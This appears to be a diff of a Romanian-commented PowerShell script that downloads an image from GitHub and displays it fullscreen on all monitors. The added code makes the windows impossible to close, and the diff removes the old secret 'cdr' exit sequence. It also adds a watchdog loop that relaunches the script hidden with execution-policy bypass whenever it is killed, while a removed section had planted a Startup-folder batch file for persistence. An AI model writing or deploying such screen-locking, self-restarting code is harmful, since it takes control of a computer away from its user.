@@ -2,7 +2,7 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
-# Descărcare imagine
+# Funcție pentru descărcarea imaginii
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
@@ -42,27 +42,16 @@ function Show-FullScreenImage {
         $pictureBox.SizeMode = 'StretchImage'
         $form.Controls.Add($pictureBox)
 
-        # Blochează închiderea
-        $form.FormClosing += {
+        # Protejează împotriva închiderii accidentale
+        $form.Add_FormClosing({
             param($sender, $eventArgs)
-            if (-not $global:exitFlag) {
-                $eventArgs.Cancel = $true
-            }
-        }
+            $eventArgs.Cancel = $true
+        })
 
         $forms += $form
     }
 
-    # Eveniment pentru ascultarea tastelor
-    $global:keySequence = ""
-    $forms[0].Add_KeyDown({
-        param($sender, $eventArgs)
-        $global:keySequence += $eventArgs.KeyChar
-        if ($global:keySequence -like "*cdr") {
-            Stop-All
-        }
-    })
-
+    # Rulează formularele pe toate monitoarele
     foreach ($form in $forms) {
         [void]$form.Show()
     }
@@ -70,35 +59,33 @@ function Show-FullScreenImage {
     [System.Windows.Forms.Application]::Run()
 }
 
-# Funcție pentru oprirea completă a aplicației
+# Funcție de monitorizare pentru repornire automată
+function Monitor-Image {
+    $scriptPath = $MyInvocation.MyCommand.Definition
+
+    while ($true) {
+        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$scriptPath*" }
+        if (-not $processes) {
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
+        }
+        Start-Sleep -Seconds 2
+    }
+}
+
+# Funcție pentru oprirea completă a aplicației (folosind `cdr`)
 function Stop-All {
     $global:exitFlag = $true
-    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
     Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
     exit
 }
 
-# Configurare pornire automată
-function Set-Startup {
-    $scriptPath = $MyInvocation.MyCommand.Path
-    $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
-    $batContent = "@echo off`nstart /min powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
-    Set-Content -Path $batFilePath -Value $batContent -Force
+# Verifică dacă scriptul este în modul principal sau monitor
+if ($MyInvocation.MyCommand.Path -eq $null) {
+    # Monitorizare
+    Monitor-Image
+} else {
+    # Pornire aplicație principală
+    Download-Image
+    Start-Job -ScriptBlock { Monitor-Image }
+    Show-FullScreenImage
 }
-
-# Monitorizare pentru persistență
-function Monitor-Process {
-    while ($true) {
-        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
-            Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
-            exit
-        }
-        Start-Sleep -Seconds 1
-    }
-}
-
-# Executare funcționalități
-Download-Image
-Set-Startup
-Start-Job -ScriptBlock { Monitor-Process }
-Show-FullScreenImage
